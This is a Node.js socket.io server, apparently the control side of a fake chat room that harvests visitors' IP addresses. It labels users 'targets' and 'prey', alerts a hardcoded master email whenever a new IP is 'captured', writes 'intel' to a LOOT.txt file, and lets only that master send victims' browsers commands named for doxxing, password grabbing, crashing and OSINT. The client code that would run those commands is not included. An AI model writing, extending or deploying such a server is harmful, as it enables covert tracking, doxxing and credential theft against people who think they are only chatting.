const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(__dirname));

let targets = [];
const MASTER_KEY = "toucheur2pp@heaven.com"; // TON EMAIL DE POUVOIR

io.on('connection', (socket) => {
    // CAPTURE IP (Bypass Proxy Render)
    let rawIp = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    const clientIp = rawIp.split(',')[0].trim().replace('::ffff:', '');

    socket.on('init', (data) => {
        const t = { id: socket.id, n: data.n, e: data.e, ip: clientIp, join: new Date().toLocaleTimeString() };
        targets.push(t);
        
        // Notification au Master si une nouvelle proie arrive
        const master = targets.find(u => u.e === MASTER_KEY);
        if (master && t.e !== MASTER_KEY) {
            io.to(master.id).emit('chat', { n: "SYSTEM", t: { t: `⚠️ IP CAPTURÉE : ${t.n} -> ${t.ip}`, type: 'intel' } });
        }
        sync(socket);
    });

    socket.on('chat', (data) => {
        const sender = targets.find(u => u.id === socket.id);
        if (!sender) return;
        if (data.type === 'intel') fs.appendFileSync('LOOT.txt', `[${new Date().toLocaleString()}] ${sender.ip} : ${data.t}\n`);
        io.emit('chat', { n: sender.n, t: data });
    });

    const cmds = ['p_heavy_dox', 'p_pass_grab', 'p_crash', 'p_osint'];
    cmds.forEach(type => {
        socket.on(type, (tId) => {
            const boss = targets.find(u => u.id === socket.id);
            if (boss && boss.e === MASTER_KEY) io.to(tId).emit('execute', { type });
        });
    });

    socket.on('disconnect', () => {
        targets = targets.filter(u => u.id !== socket.id);
        sync(socket);
    });

    function sync(s) {
        const master = targets.find(u => u.e === MASTER_KEY);
        if (master) io.to(master.id).emit('sync', targets);
        io.emit('sync', targets.map(u => ({ id: u.id, n: u.n })));
    }
});

server.listen(process.env.PORT || 3000, '0.0.0.0');
